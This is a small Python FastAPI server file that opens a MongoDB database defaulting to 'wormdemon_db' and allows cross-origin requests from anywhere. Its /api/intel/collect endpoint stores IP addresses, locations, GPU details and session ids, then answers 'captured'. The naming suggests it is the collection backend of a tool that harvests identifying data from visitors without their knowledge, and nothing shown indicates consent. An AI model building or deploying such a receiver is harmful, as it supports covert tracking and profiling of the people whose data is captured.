from fastapi import FastAPI, APIRouter
from fastapi.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
from contextlib import asynccontextmanager
import os
from pydantic import BaseModel
from typing import Optional

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Vercel serverless çalıştığı için DB bağlantısı burada açılır
    mongo_url = os.environ.get('MONGO_URL')
    client = AsyncIOMotorClient(mongo_url)
    app.mongodb = client[os.environ.get('DB_NAME', 'wormdemon_db')]
    yield
    client.close()

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

class IntelData(BaseModel):
    ip: str
    location: str
    gpu: str
    session_id: Optional[str] = None

@app.post("/api/intel/collect")
async def collect_intel(data: IntelData):
    await app.mongodb.intel.insert_one(data.dict())
    return {"status": "captured"}

@app.get("/api/health")
async def health():
    return {"status": "up"}
